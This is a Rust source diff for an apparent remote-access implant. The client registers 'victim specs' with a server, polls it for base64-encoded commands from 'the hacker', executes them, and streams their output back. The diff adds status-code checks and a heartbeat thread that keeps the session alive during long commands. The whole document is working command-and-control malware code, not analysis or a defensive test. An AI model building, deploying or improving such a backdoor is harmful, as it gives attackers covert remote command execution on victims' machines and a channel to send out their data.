@@ -14,6 +14,7 @@ use std::{
     io::{self, BufRead},
     os::unix::process::ExitStatusExt,
     process as ps,
+    sync::mpsc,
     thread::{self, JoinHandle},
     time::Duration,
 };
@@ -36,7 +37,7 @@ pub fn run() {
 
 trait SafeSend {
     // Send requests with auto retry functionality
-    fn safe_send(self) -> rq::Response;
+    fn safe_send(self, expected_status_codes: Option<&[st]>) -> Result<rq::Response, ()>;
     fn safe_body<T: Clone + Into<rq::Body>>(self, body: T) -> rq::RequestBuilder;
 }
 
@@ -45,7 +46,7 @@ impl SafeSend for rq::RequestBuilder {
         self.body(body)
     }
 
-    fn safe_send(self) -> rq::Response {
+    fn safe_send(self, expected_status_codes: Option<&[st]>) -> Result<rq::Response, ()> {
         let mut loop_count = 0;
         let config = Config::new();
 
@@ -54,8 +55,14 @@ impl SafeSend for rq::RequestBuilder {
             // because we will use `safe_body`, which make sure
             // the body is clone able.
             if let Ok(result) = self.try_clone().unwrap().send() {
+                // check if the status code was in the expected codes
+                if let Some(expected_status_codes) = expected_status_codes {
+                    if !expected_status_codes.contains(&result.status()) {
+                        break Err(());
+                    }
+                }
                 // send was successful
-                break result;
+                break Ok(result);
             } else {
                 // send failed, so this is determines how many seconds
                 // before retrying.
@@ -106,6 +113,8 @@ impl<'a> PostRes<'a> {
     }
 }
 
+struct StopSignal;
+
 pub fn mainloop(client: &rq::Client, endpoints: &EndPoints, config: &Config) {
     // Part of the code that repeats for the duration of the program
     loop {
@@ -113,7 +122,10 @@ pub fn mainloop(client: &rq::Client, endpoints: &EndPoints, config: &Config) {
             // fetch the session_id by requesting the server for it every
             // configured second, when session is found the session_id will be returned
             // to the variable
-            let get_session = client.get(&endpoints.get_session).safe_send();
+
+            // Here we won't put in the expected status codes because we don't
+            // want to stop execution of the program.
+            let get_session = client.get(&endpoints.get_session).safe_send(None).unwrap();
 
             if get_session.status() == st::OK {
                 break get_session.text().unwrap();
@@ -131,19 +143,22 @@ pub fn mainloop(client: &rq::Client, endpoints: &EndPoints, config: &Config) {
                 let cmd_res = client
                     .get(&endpoints.fetch_cmd)
                     .safe_body(session_id.clone())
-                    .safe_send();
+                    .safe_send(Some(&[st::OK, st::NO_CONTENT]));
 
-                if cmd_res.status() == st::OK {
-                    let res_string = cmd_res.text().unwrap();
-                    break Some(b64_decode(&res_string));
-                } else if cmd_res.status() == st::NO_CONTENT {
-                    // this means if the hacker didn't provide a command
-                    // where we will just retry
-                    sleep(config.request_rate.into());
-                } else {
-                    // Session has been killed, so let's get out
-                    // or may be some other weird stuff happened
-                    break None;
+                match cmd_res {
+                    Ok(response) => {
+                        if response.status() == st::OK {
+                            let res_string = response.text().unwrap();
+                            break Some(b64_decode(&res_string));
+                        } else if response.status() == st::NO_CONTENT {
+                            // this means if the hacker didn't provide a command
+                            // where we will just retry
+                            sleep(config.request_rate.into());
+                        }
+                    }
+                    Err(_) => {
+                        break None;
+                    }
                 }
             };
 
@@ -157,7 +172,7 @@ pub fn mainloop(client: &rq::Client, endpoints: &EndPoints, config: &Config) {
             let command = command.unwrap();
 
             // simplify sending a failed to execute
-            let failed_to_execute = || {
+            let failed_to_execute = || -> Result<rq::Response, ()> {
                 client
                     .post(&endpoints.post_res)
                     .safe_body(
@@ -173,25 +188,39 @@ pub fn mainloop(client: &rq::Client, endpoints: &EndPoints, config: &Config) {
                             .unwrap(),
                         ),
                     )
-                    .safe_send();
+                    .safe_send(Some(&[st::OK]))
             };
 
             // break down command into a vec using shlex
             let command = match split(&command) {
-                None => {
-                    failed_to_execute();
-                    break;
-                }
+                None => match failed_to_execute() {
+                    Ok(_) | Err(_) => break,
+                },
                 Some(cmd) => {
                     if cmd.is_empty() {
-                        failed_to_execute();
-                        break;
+                        match failed_to_execute() {
+                            Ok(_) | Err(_) => break,
+                        };
                     } else {
                         cmd
                     }
                 }
             };
 
+            // Spawning a thread to make empty post_res requests to
+            // the server, to let the server know that we are alive even if
+            // there is a long program that needs to execute and the necessary
+            // post_res request couldn't be addressed.
+
+            let (tx, rx) = mpsc::channel();
+
+            let alive_updater_handle = alive_updater(
+                client.clone(),
+                endpoints.post_res.to_string(),
+                b64_decode(&session_id),
+                config.request_rate,
+                rx,
+            );
             // the GLORIOUS command execution
             execute_command(
                 &command,
@@ -200,18 +229,57 @@ pub fn mainloop(client: &rq::Client, endpoints: &EndPoints, config: &Config) {
                 endpoints.post_res.to_owned(),
                 failed_to_execute,
             );
+            // stop the alive_updater_handle
+            tx.send(StopSignal {}).unwrap();
+            // join the updater handle
+            alive_updater_handle.join().unwrap();
         }
     }
 }
 
-fn send_cmd_execution_output(client: &rq::Client, post_res_path: &str, post_body: &PostRes) {
+fn alive_updater(
+    client: rq::Client,
+    post_res_path: String,
+    session_id: String,
+    request_rate: u16,
+    rx: mpsc::Receiver<StopSignal>,
+) -> JoinHandle<()> {
+    thread::spawn(move || loop {
+        if rx
+            .recv_timeout(Duration::from_secs((request_rate * 3).into()))
+            .is_ok()
+        {
+            // We have received a stop message so we will break
+            break;
+        } else {
+            let post_body = PostRes::new(&session_id, "", "", true, false, None);
+            // Good luck reading this
+            match client
+                .post(&post_res_path)
+                .safe_body(b64.encode(serde_json::to_string(&post_body).unwrap()))
+                .safe_send(Some(&[st::OK]))
+            {
+                Ok(response) => response,
+                Err(_) => break,
+            };
+        }
+    })
+}
+
+fn send_cmd_execution_output(
+    client: &rq::Client,
+    post_res_path: &str,
+    post_body: &PostRes,
+) -> Result<rq::Response, ()> {
+    // If the responses code was anything other than OK we will return the
+    // Error variant from the Result Enum
     client
         .post(post_res_path)
         .safe_body(b64.encode(serde_json::to_string(post_body).unwrap()))
-        .safe_send();
+        .safe_send(Some(&[st::OK]))
 }
 
-fn execute_command<F: Fn()>(
+fn execute_command<F: Fn() -> Result<rq::Response, ()>>(
     command: &Vec<String>,
     client: rq::Client,
     session_id: String,
@@ -234,38 +302,52 @@ fn execute_command<F: Fn()>(
                 let reader = io::BufReader::new(stderr);
                 let client = client.clone();
                 let session_id = session_id.clone();
-                let post_cmd_path = post_res_path.clone();
+                let post_res_path = post_res_path.clone();
                 stderr_write_thread = thread::spawn(move || {
                     for line in reader.lines() {
                         // Send the line to the server
                         let current_line = line.unwrap();
                         let post_body =
                             PostRes::new(&session_id, "", &current_line, false, false, None);
-                        send_cmd_execution_output(&client, &post_cmd_path, &post_body);
+                        if let Err(()) =
+                            send_cmd_execution_output(&client, &post_res_path, &post_body)
+                        {
+                            // we don't know what happened at the server but we need to stop this
+                            // command execution.
+                            return;
+                        }
                     }
                 });
             } else {
-                failed_to_execute();
-                return;
+                match failed_to_execute() {
+                    Ok(_) | Err(_) => return,
+                };
             }
 
             if let Some(stdout) = child.stdout.take() {
                 let reader = io::BufReader::new(stdout);
                 let client = client.clone();
                 let session_id = session_id.clone();
-                let post_cmd_path = post_res_path.clone();
+                let post_res_path = post_res_path.clone();
                 stdout_write_thread = thread::spawn(move || {
                     for line in reader.lines() {
                         // Send the line to the server
                         let current_line = line.unwrap();
                         let post_body =
                             PostRes::new(&session_id, &current_line, "", false, false, None);
-                        send_cmd_execution_output(&client, &post_cmd_path, &post_body);
+                        if let Err(()) =
+                            send_cmd_execution_output(&client, &post_res_path, &post_body)
+                        {
+                            // we don't know what happened at the server but we need to stop this
+                            // command execution.
+                            return;
+                        }
                     }
                 });
             } else {
-                failed_to_execute();
-                return;
+                match failed_to_execute() {
+                    Ok(_) | Err(_) => return,
+                };
             }
 
             // make sure the stdout, and stderr threads finish
@@ -283,17 +365,25 @@ fn execute_command<F: Fn()>(
                     }
                     let post_body =
                         PostRes::new(&session_id, "", "", false, false, Some(final_status_code));
-                    send_cmd_execution_output(&client, &post_res_path, &post_body);
+                    if let Err(()) = send_cmd_execution_output(&client, &post_res_path, &post_body)
+                    {
+                        // we don't know what happened at the server but we need to stop this
+                        // command execution.
+                        return;
+                    }
                 }
                 Err(_) => {
-                    failed_to_execute();
-                    return;
+                    match failed_to_execute() {
+                        Ok(_) | Err(_) => return,
+                    };
                 }
             };
         }
         Err(_) => {
             // Failed to spawn the child process
-            failed_to_execute();
+            match failed_to_execute() {
+                Ok(_) | Err(_) => return,
+            }
         }
     }
 }
@@ -393,7 +483,8 @@ fn register(client: &rq::Client, register_path: &str) {
     let status = client
         .post(register_path)
         .safe_body(b64.encode(serde_json::to_value(victim_specs).unwrap().to_string()))
-        .safe_send()
+        .safe_send(None)
+        .unwrap()
         .status();
 
     if status == st::INTERNAL_SERVER_ERROR {
